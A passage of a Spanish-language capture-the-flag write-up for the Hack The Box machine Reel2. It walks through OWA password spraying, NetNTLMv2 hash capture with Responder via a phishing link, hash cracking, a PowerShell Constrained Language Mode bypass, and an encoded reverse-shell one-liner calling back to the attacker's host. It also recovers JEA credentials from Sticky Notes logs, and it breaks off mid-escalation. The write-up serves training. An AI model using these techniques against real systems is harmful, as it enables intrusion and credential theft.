@@ -1,0 +1,506 @@
+---
+layout: post
+title: Reel2
+date: 2023-02-15
+description:
+img:
+fig-caption:
+tags: [OSCP, OSEP]
+---
+___
+
+<center><img src="/writeups/assets/img/Reel2-htb/Reel2.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Information Disclosure
+
+* Fuerza bruta en OWA
+
+* Interceptación hash NetNTLMv2
+
+* Uso de PSSessions
+
+* CLM Bypass
+
+* Abuso de StickyNotes
+
+* Abuso de Capabilities
+
+* LFI
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.210 -sS -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 18:40 GMT
+Nmap scan report for 10.10.10.210
+Host is up (0.23s latency).
+Not shown: 65519 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+80/tcp   open  http
+443/tcp  open  https
+5985/tcp open  wsman
+6001/tcp open  X11:1
+6002/tcp open  X11:2
+6004/tcp open  X11:4
+6005/tcp open  X11:5
+6006/tcp open  X11:6
+6007/tcp open  X11:7
+6008/tcp open  X11:8
+6010/tcp open  x11
+6011/tcp open  x11
+6012/tcp open  x11
+6017/tcp open  xmail-ctrl
+6022/tcp open  x11
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 71.65 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p80,443,5985,6001,6002,6004,6005,6006,6007,6008,6010,6011,6012,6017,6022,8080 10.10.10.210 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 18:42 GMT
+Nmap scan report for 10.10.10.210
+Host is up (0.29s latency).
+
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 8.5
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: 403 - Forbidden: Access is denied.
+443/tcp  open  ssl/http   Microsoft IIS httpd 8.5
+| ssl-cert: Subject: commonName=Reel2
+| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local
+| Not valid before: 2020-07-30T10:12:46
+|_Not valid after:  2025-07-30T10:12:46
+|_ssl-date: 2023-02-15T18:43:49+00:00; +1s from scanner time.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: IIS Windows Server
+5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6005/tcp open  msrpc      Microsoft Windows RPC
+6006/tcp open  msrpc      Microsoft Windows RPC
+6007/tcp open  msrpc      Microsoft Windows RPC
+6008/tcp open  msrpc      Microsoft Windows RPC
+6010/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6011/tcp open  msrpc      Microsoft Windows RPC
+6012/tcp open  msrpc      Microsoft Windows RPC
+6017/tcp open  msrpc      Microsoft Windows RPC
+6022/tcp open  msrpc      Microsoft Windows RPC
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Welcome | Wallstant
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 90.88 seconds
+```
+
+## Puerto 80, 8080 (HTTP) | Puerto 443 (HTTPS)
+
+Con whatweb analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.10.210
+http://10.10.10.210 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.210], Microsoft-IIS[8.5], Title[403 - Forbidden: Access is denied.], X-Powered-By[ASP.NET]
+
+whatweb https://10.10.10.210
+https://10.10.10.210 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.210], Microsoft-IIS[8.5][Under Construction], Title[IIS Windows Server], X-Powered-By[ASP.NET]
+
+whatweb http://10.10.10.210:8080
+http://10.10.10.210:8080 [200 OK] Apache[2.4.43], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32], IP[10.10.10.210], JQuery, Meta-Author[Munaf Aqeel Mahdi], OpenSSL[1.1.1g], PHP[7.2.32], PasswordField[login_password], Script[text/javascript], Title[Welcome | Wallstant], X-Powered-By[PHP/7.2.32]
+```
+
+Aplico fuzzing por el puerto 80 y encuentro una ruta
+
+```null
+gobuster dir -u http://10.10.10.210/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -b 403
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.210/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403
+[+] User Agent:              gobuster/3.4
+[+] Timeout:                 10s
+===============================================================
+2023/02/15 16:47:56 Starting gobuster in directory enumeration mode
+===============================================================
+/owa                  (Status: 301) [Size: 0] [--> /owa/]
+===============================================================
+2023/02/15 16:50:24 Finished
+===============================================================
+```
+
+Corresponde a un Outlook Web App. No dispongo de credenciales, así que de momento lo dejo de lado
+
+<img src="/writeups/assets/img/Reel2-htb/3.png" alt="">
+
+En el puerto 8080 hay un panel de inicio de sesión
+
+<img src="/writeups/assets/img/Reel2-htb/1.png" alt="">
+
+Puedo registrarme
+
+<img src="/writeups/assets/img/Reel2-htb/2.png" alt="">
+
+Dentro hay una publicación, en la hay que intuir que hay una contraseña, cuyo valor es ```Summer2020```
+
+<img src="/writeups/assets/img/Reel2-htb/4.png" alt="">
+
+Es posible listar todos los usuarios de la red social al dejar en blanco el parámetro de búsqueda
+
+<img src="/writeups/assets/img/Reel2-htb/5.png" alt="">
+
+Creo una expresión regular para guardarlos en un diccionario
+
+```null
+curl -s -X GET 'http://10.10.10.210:8080/search?q=' | grep "user_follow_box_a" | awk '{print $4 " " $6}' FS=">" | sed 's/<br @//' | sed 's/<\/span//' > users
+```
+
+Como no se la estructura que se está utilizando en caso de que estos usuarios sean válidos a nivel de sistema, utilizo una herramienta llamada ```atomizer.py```, perteneciente al repositorio ```SprayingToolkit``` disponible en [Github](https://github.com/byt3bl33d3r/SprayingToolkit)
+
+```null
+git clone https://github.com/byt3bl33d3r/SprayingToolkit
+cd SprayingToolkit
+pip3 install -r requirements.txt
+```
+
+```null
+python3 /opt/SprayingToolkit/spindrift.py users --format "{f}.{last}" > bruteusers
+python3 /opt/SprayingToolkit/spindrift.py users --format "{f}{last}" >> bruteusers
+python3 /opt/SprayingToolkit/spindrift.py users --format "{first}{last}" >> bruteusers
+python3 /opt/SprayingToolkit/spindrift.py users --format "{first}.{l}" >> bruteusers
+python3 /opt/SprayingToolkit/spindrift.py users --format "{first}.{last}" >> bruteusers
+```
+
+Intercepto con ```BurpSuite``` una petición de prueba para ver como se tramita
+
+<img src="/writeups/assets/img/Reel2-htb/6.png" alt="">
+
+No basta con fuzzear cambiando la data por POST. El OWA arrastra otras cabeceras y realiza varias peticiones por GET antes de llegar a este punto, por lo que es conveniente utilizar una herramienta ya preparada para ello. En mi caso utilizaré ```atomizer.py```, de este mismo repositorio
+
+```null
+python3 atomizer.py owa 10.10.10.210 'Summer2020' bruteusers
+```
+
+Son válidas para ```s.svensson```
+
+Desde Firefox he tenido problemas para abrir la Web, por lo que me pasé a Chromium
+
+<img src="/writeups/assets/img/Reel2-htb/7.png" alt="">
+
+Puedo enviar un mensaje a todos los contactos
+
+<img src="/writeups/assets/img/Reel2-htb/8.png" alt="">
+
+Envío un correo con un enlace que hace referencia a un recurso compartido por SMB a mi equipo, y con responder me quedo en escucha
+
+<img src="/writeups/assets/img/Reel2-htb/9.png" alt="">
+
+```null
+responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Listening for events...
+
+[HTTP] NTLMv2 Client   : 10.10.10.210
+[HTTP] NTLMv2 Username : htb\k.svensson
+[HTTP] NTLMv2 Hash     : k.svensson::htb:8aa9a11327a75ec0:AAFB3E55E50BF63D41912F58B354908C:01010000000000002EA97D616C41D9014C478F23ACFBB05D0000000002000800560046005000340001001E00570049004E002D0053004E0043004F0039004800540037004900410035000400140056004600500034002E004C004F00430041004C0003003400570049004E002D0053004E0043004F0039004800540037004900410035002E0056004600500034002E004C004F00430041004C000500140056004600500034002E004C004F00430041004C000800300030000000000000000000000000400000466422585B4C5E3ABC4322EC799F049A7F5DF5A837A1EE44344660DCF97B6B800A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310036002E0032000000000000000000
+```
+
+Obtengo un hash NetNTLMv2 que puedo tratar de crackear
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+kittycat1        (k.svensson)     
+1g 0:00:00:00 DONE (2023-02-15 18:37) 50.00g/s 409600p/s 409600c/s 409600C/s honeybear..total90
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Gano acceso por WINRM, pero recibo un error
+
+```null
+ evil-winrm -i 10.10.10.210 -u 'k.svensson' -p 'kittycat1'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException> 
+```
+
+Para bypassear esta restricción, puedo ganar acceso con PSSessions
+
+```null
+pwsh
+PowerShell 7.3.0
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> $SecPassword = ConvertTo-SecureString 'kittycat1' -AsPlainText -Force   
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\k.svensson', $SecPassword)
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred
+Enter-PSSession: MI_RESULT_ACCESS_DENIED
+```
+
+De primeras no puedo autenticarme. Pero por el protocolo por defecto
+
+```null
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate
+[10.10.10.210]: PS>whoami
+The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
+again.
+    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundExceptio
+```
+
+Ahora que estoy dentro, no puedo ejecutar prácticamente ningún comando. Esto puede ser porque esté implementado un Constrained Language Mode
+
+```null
+[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode                                                       
+ConstrainedLanguage
+```
+
+Una forma de burlarlo, es creando una propia función que se encargue de ejecutar el comando, para así llamarlo de forma relativa y no lo bloquee
+
+```null
+[10.10.10.210]: PS> function bypassCLM { whoami }
+[10.10.10.210]: PS>bypassCLM
+htb\k.svensson
+```
+
+Para escapar de este contexto, me envío una reverse shell a mi equipo
+
+```null
+cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
+```
+
+```null
+[10.10.10.210]: P> function reverse { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMgAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA== }
+[10.10.10.210]: PS>reverse
+```
+
+Recibo la sesión en netcat
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.210] 43813
+
+PS C:\Users\k.svensson\Documents> whoami
+htb\k.svensson
+PS C:\Users\k.svensson\Documents> 
+```
+
+Puedo visualizar la primera flag
+
+```null
+PS C:\Users\k.svensson\Desktop> type user.txt
+5e098a72917cf6973f1af007b1758e31
+```
+
+# Escalada
+
+En su directorio personal de Documentos hay datos
+
+```null
+PS C:\Users\k.svensson\Documents> dir
+
+
+    Directory: C:\Users\k.svensson\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        7/30/2020   5:14 PM                WindowsPowerShell                                                     
+-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc                                                 
+-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc                                                 
+```
+
+Es probable que se ejecuten cada cierto tiempo
+
+Uno de ellos contiene un Token
+
+```null
+# Assemblies to load when applied to a session
+# AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+```
+
+Está definida una función que se encarga de ejecutar comandos con el uso de ScriptBlocks
+
+```null
+FunctionDefinitions = @{
+    'Name' = 'Check-File'
+    'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like 
+"C:\ProgramData\*" ; if($check) {get-content $Path}} }
+```
+
+Se le está pasando como argumento un archivo procedente de una de esas dos rutas
+
+Este usuario tiene asignanadas capabilities
+
+```null
+# User roles (security groups), and the role capabilities that should be applied to them when applied to a session
+RoleDefinitions = @{
+    'htb\jea_test_account' = @{
+        'RoleCapabilities' = 'jea_test_account' } }
+```
+
+En el escritorio hay un enlace simbólico a las Sticky Notes, por lo que quiero pensar que es una pista para intentar leer su contenido
+
+```null
+PS C:\Users\k.svensson\Desktop> dir
+
+
+    Directory: C:\Users\k.svensson\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        2/12/2021   5:12 PM                WinDirStatPortable                                                    
+-a----         2/8/2021   5:55 PM        1490312 procexp64.exe                                                         
+-a----        7/30/2020   1:19 PM           2428 Sticky Notes.lnk                                                      
+-a----         2/8/2021   5:54 PM        2591096 Sysmon64.exe                                                          
+-ar---        2/15/2023   5:39 PM             34 user.txt       
+```
+
+Dentro de la ruta %appdata% de k.svensson, están los LOGs de las Sticky Notes. Pero hay caracteres que no son legibles. La solución es pasarlo a base64
+
+```null
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> [convert]::ToBase64String((Get-Content -path "000003.log" -Encoding byte))
+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
+```
+
+Lo guardo en mi equipo para verlo en hexadecimal. En las primeras líneas, parece haber una contraseña
+
+```null
+cat data | base64 -d | xxd
+00000000: 2fe1 8075 4200 0101 0000 0000 0000 0003  /..uB...........
+00000010: 0000 0001 0756 4552 5349 4f4e 0131 000c  .....VERSION.1..
+00000020: 4d45 5441 3a61 7070 3a2f 2f2e 001b 5f61  META:app://..._a
+00000030: 7070 3a2f 2f2e 0001 5f5f 7374 6f72 656a  pp://...__storej
+00000040: 735f 5f74 6573 745f 5f5a 9296 395b 0101  s__test__Z..9[..
+00000050: 0400 0000 0000 0000 0500 0000 010c 4d45  ..............ME
+00000060: 5441 3a61 7070 3a2f 2f2e 0c08 9ea4 a89a  TA:app://.......
+00000070: d2c7 c217 10f2 0101 0b5f 6170 703a 2f2f  ........._app://
+00000080: 2e00 0131 c901 017b 2266 6972 7374 223a  ...1...{"first":
+00000090: 223c 703e 4372 6564 656e 7469 616c 7320  "<p>Credentials 
+000000a0: 666f 7220 4a45 413c 2f70 3e3c 703e 6a65  for JEA</p><p>je
+000000b0: 615f 7465 7374 5f61 6363 6f75 6e74 3a41  a_test_account:A
+000000c0: 6221 5140 7663 675e 2540 2331 3c2f 703e  b!Q@vcg^%@#1</p>
+000000d0: 222c 2262 6163 6b22 3a22 7267 6228 3235  ","back":"rgb(25
+
+...
+```
+
+Creo unas PSCredentials y pruebo a ejecutar comandos como este usuario. Con ScriptBlocks no tengo acceso
+
+```null
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> $SecPassword = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\jea_test_account', $SecPassword)
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> Invoke-Command -Credential $Cred -ComputerName localhost -ScriptBlock { whoami }
+PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> Invoke-Command -Credential $Cred -ComputerName localhost -ScriptBlock { whoami } 2>&1
+[localhost] Connecting to remote server localhost failed with the following error message : Access is denied. For more 
+information, see the about_Remote_Troubleshooting Help topic.
+    + CategoryInfo          : OpenError: (localhost:String) [], PSRemotingTransportException
+    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
+```
+
+Con PSSessions tampoco
+
+```null
+pwsh
+PowerShell 7.3.0
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> $SecPassword = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\jea_test_account', $SecPassword)
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate                                                                               
+Enter-PSSession: Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic. 
+```
+
+Esto es debido a que el usuario está utilizando su propio archivo de configuración de Powershell. Para que no extraiga el común de las variables de entorno, hay que indicarlo manualmente
+
+```null
+PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate -ConfigurationName jea_test_account
